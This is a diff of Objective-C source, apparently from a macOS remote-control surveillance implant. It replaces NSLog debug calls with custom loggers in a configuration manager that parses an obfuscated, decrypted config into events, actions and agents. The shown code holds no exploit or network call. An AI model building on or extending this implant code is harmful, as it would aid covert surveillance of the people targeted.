@@ -18,8 +18,9 @@
 #import "RCSMCommon.h"
 #import "RCSMUtils.h"
 
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
-//#define DEBUG
 
 #pragma mark -
 #pragma mark Private Interface
@@ -88,15 +89,15 @@ static int actionCounter = 0;
                                  length: sizeof(eventStruct)];
       
       header = (eventStruct *)[rawHeader bytes];
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"event size: %x", header->internalDataSize);
-      NSLog(@"event type: %x", header->type);
+#ifdef DEBUG_CONF_MANAGER
+      verboseLog(@"event size: %x", header->internalDataSize);
+      verboseLog(@"event type: %x", header->type);
 #endif
       if (header->internalDataSize)
         {
           NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                             length: header->internalDataSize];
-          //NSLog(@"event data: %@", tempData);
+          //infoLog(@"event data: %@", tempData);
           
           [taskManager registerEvent: tempData
                                 type: header->type
@@ -109,7 +110,7 @@ static int actionCounter = 0;
       
       // Jump to the next event (dataSize + PAD)
       pos += header->internalDataSize + 0xC;
-      //NSLog(@"pos %x", pos);
+      //infoLog(@"pos %x", pos);
     }
   
   return pos + 0x10;
@@ -129,13 +130,13 @@ static int actionCounter = 0;
     {      
       rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                  length: sizeof(actionContainerStruct)];
-      //NSLog(@"RAW Header: %@", rawHeader);
+      //infoLog(@"RAW Header: %@", rawHeader);
 
       headerContainer = (actionContainerStruct *)[rawHeader bytes];
-      //NSLog(@"subactions (%d)", headerContainer->numberOfSubActions);
+      //infoLog(@"subactions (%d)", headerContainer->numberOfSubActions);
 
       pos += sizeof(actionContainerStruct);
-      //NSLog(@"subactions: %d", headerContainer->numberOfSubActions);
+      //infoLog(@"subactions: %d", headerContainer->numberOfSubActions);
       //pos += headerContainer->internalDataSize;
       
       for (z = 0; z < headerContainer->numberOfSubActions; z++)
@@ -143,18 +144,17 @@ static int actionCounter = 0;
           rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                      length: sizeof(actionStruct)];
           header = (actionStruct *)[rawHeader bytes];
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"RAW Header: %@", rawHeader);
-          NSLog(@"action type: %x", header->type);
-          NSLog(@"action size: %x", header->internalDataSize);
-          //NSLog(@"action data: %@", header->internalData);
+#ifdef DEBUG_CONF_MANAGER
+          verboseLog(@"RAW Header: %@", rawHeader);
+          verboseLog(@"action type: %x", header->type);
+          verboseLog(@"action size: %x", header->internalDataSize);
 #endif
           if (header->internalDataSize > 0)
             {
               NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0x8
                                                 length: header->internalDataSize];
               
-              //NSLog(@"%@", tempData);
+              //infoLog(@"%@", tempData);
               pos += header->internalDataSize + 0x8;
               
               [taskManager registerAction: tempData
@@ -191,15 +191,15 @@ static int actionCounter = 0;
                                  length: sizeof(agentStruct)];
       
       header = (agentStruct *)[rawHeader bytes];
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"agent ID: %x", header->agentID);
-      NSLog(@"agent status: %d", header->status);
+#ifdef DEBUG_CONF_MANAGER
+      verboseLog(@"agent ID: %x", header->agentID);
+      verboseLog(@"agent status: %d", header->status);
 #endif
       if (header->internalDataSize)
         {
           NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                             length: header->internalDataSize];
-          //NSLog(@"%@", tempData);
+          //infoLog(@"%@", tempData);
           // Jump to the next event (dataSize + PAD)
           pos += header->internalDataSize + 0xC;
           
@@ -216,7 +216,7 @@ static int actionCounter = 0;
                               status: header->status];
         }
       
-      //NSLog(@"pos %x", pos);
+      //infoLog(@"pos %x", pos);
     }
   
   return pos + 0x10;
@@ -262,21 +262,11 @@ static int actionCounter = 0;
 
 - (BOOL)loadConfiguration
 {
-  NSString *configurationFile;
   actionCounter = 0;
   
-#ifdef DEBUG
-  NSLog(@"%s", __FUNCTION__);
-#endif
-      
-#ifdef DEV_MODE
-  configurationFile = [[NSString alloc] initWithString:
-                       @"/Users/revenge/Desktop/files/test_configuration/conf_macos.bin"];
-#else
-  configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
-                       [[NSBundle mainBundle] bundlePath],
-                       gConfigurationName];
-#endif
+  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
+                                 [[NSBundle mainBundle] bundlePath],
+                                 gConfigurationName];
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: configurationFile])
     {
@@ -294,8 +284,8 @@ static int actionCounter = 0;
           //
           [taskManager removeAllElements];
           
-#ifdef DEBUG_ERRORS
-          [configuration writeToFile: @"/Users/revenge/Desktop/conf_decrypted.bin"
+#ifdef DEBUG_CONF_MANAGER
+          [configuration writeToFile: @"/tmp/conf_decrypted.bin"
                           atomically: YES];
 #endif
           
@@ -315,8 +305,8 @@ static int actionCounter = 0;
             }
           @catch (NSException *e)
             {
-#ifdef DEBUG
-              NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_CONF_MANAGER
+              errorLog(@"%s exception", __FUNCTION__);
 #endif
               
               return NO;
@@ -337,8 +327,8 @@ static int actionCounter = 0;
               //
               [mConfigurationData getBytes: &numberOfOccurrences
                                      range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG_VERBOSE_1
-              NSLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
+#ifdef DEBUG_CONF_MANAGER
+              verboseLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
 #endif
               // Skip numberOfEvents (DWORD)
               pos += sizeof(int);
@@ -351,8 +341,8 @@ static int actionCounter = 0;
                 }
               @catch (NSException *e)
                 {
-#ifdef DEBUG
-                  NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_CONF_MANAGER
+                  errorLog(@"%s exception", __FUNCTION__);
 #endif
                 
                   return NO;              
@@ -362,8 +352,8 @@ static int actionCounter = 0;
             }
           else
             {
-#ifdef DEBUG_ERRORS
-              NSLog(@"event - searchDataForToken sux");
+#ifdef DEBUG_CONF_MANAGER
+              errorLog(@"event - searchDataForToken sux");
 #endif
               
               return NO;
@@ -373,14 +363,14 @@ static int actionCounter = 0;
           // parseActions here since our wonderful/functional/flexible/extendible configuration
           // file doesn't have an action header, obfuscation FTW
           //
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"Offset: %x", offsetActions);
+#ifdef DEBUG_CONF_MANAGER
+          verboseLog(@"Offset: %x", offsetActions);
 #endif
           // Read num of actions
           [mConfigurationData getBytes: &numberOfOccurrences
                                  range: NSMakeRange(offsetActions, sizeof(int))];
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
+#ifdef DEBUG_CONF_MANAGER
+          verboseLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
 #endif
           // Skip numberOfActions (DWORD)
           offsetActions += sizeof(int);
@@ -393,14 +383,14 @@ static int actionCounter = 0;
             }
           @catch (NSException *e)
             {
-#ifdef DEBUG
-              NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_CONF_MANAGER
+              errorLog(@"%s exception", __FUNCTION__);
 #endif
           
               return NO;              
             }
           
-          //NSLog(@"actions %@", tempData);
+          //infoLog(@"actions %@", tempData);
           [self _parseActions: tempData nTimes: numberOfOccurrences];
           
           if ([self _searchDataForToken: mConfigurationData
@@ -415,8 +405,8 @@ static int actionCounter = 0;
               //
               [mConfigurationData getBytes: &numberOfOccurrences
                                      range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG_VERBOSE_1
-              NSLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
+#ifdef DEBUG_CONF_MANAGER
+              verboseLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
 #endif
               // Skip numberOfAgents (DWORD)
               pos += sizeof(int);
@@ -429,8 +419,8 @@ static int actionCounter = 0;
                 }
               @catch (NSException *e)
                 {
-#ifdef DEBUG
-                  NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_CONF_MANAGER
+                  errorLog(@"%s exception", __FUNCTION__);
 #endif
               
                   return NO;              
@@ -440,8 +430,8 @@ static int actionCounter = 0;
             }
           else
             {
-#ifdef DEBUG_ERRORS
-              NSLog(@"agents - searchDataForToken sux");
+#ifdef DEBUG_CONF_MANAGER
+              errorLog(@"agents - searchDataForToken sux");
 #endif
               
               return NO;
@@ -454,8 +444,8 @@ static int actionCounter = 0;
     }
   else
     {
-#ifdef DEBUG
-      NSLog(@"Configuration file not found @ %@", configurationFile);
+#ifdef DEBUG_CONF_MANAGER
+      errorLog(@"Configuration file not found @ %@", configurationFile);
 #endif
       [configurationFile release];
       
